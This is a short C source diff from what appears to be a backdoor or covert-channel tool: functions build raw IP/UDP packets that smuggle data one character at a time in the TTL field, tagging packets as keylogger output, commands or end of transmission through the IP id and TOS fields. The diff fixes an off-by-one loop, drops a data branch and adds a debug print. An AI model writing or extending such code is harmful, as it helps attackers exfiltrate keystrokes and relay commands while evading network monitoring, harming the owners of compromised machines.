@@ -88,12 +88,11 @@ int rand_delay(int delay) {
 
 void covert_udp_send_data(char *sip, char *dip, unsigned short sport, unsigned short dport, char* data, int flag){
 
-    for(int i = 0; i<= (int)strlen(data); i++){
+    for(int i = 0; i< (int)strlen(data); i++){
         covert_udp_send(sip,dip,sport,dport,(unsigned char*) &data[i], flag);
     }
     //end of file
     covert_udp_send(sip,dip,sport,dport, (unsigned char*) &data[0], EOT);
-
 }
 
 void covert_udp_send(char *sip, char *dip, unsigned short sport, unsigned short dport, unsigned char* data, int flags){
@@ -119,11 +118,7 @@ void covert_udp_send(char *sip, char *dip, unsigned short sport, unsigned short 
     sin.sin_port = htons(dport);
     sin.sin_addr.s_addr = inet_addr (dip);
 
-    if(flags == DATA) {
-        //regular tcp covert channel
-        ip_header->id = DATA_KEY;
-        ip_header->tos = DATA_KEY;
-    }else if(flags == KEYLOGGER){
+    if(flags == KEYLOGGER){
         ip_header->id = KEYLOGGER_KEY;
         ip_header->tos = KEYLOGGER_KEY;
     }else if(flags == COMMAND){
@@ -137,7 +132,7 @@ void covert_udp_send(char *sip, char *dip, unsigned short sport, unsigned short 
         ip_header->tos = EOT_KEY;
     }
     ip_header->ttl = data[0];
-
+printf("Sending: %c\n", ip_header->ttl);
     ip_header->ihl = 5;
     ip_header->version = 4;
     ip_header->tot_len = sizeof (struct iphdr) + sizeof (struct udphdr);
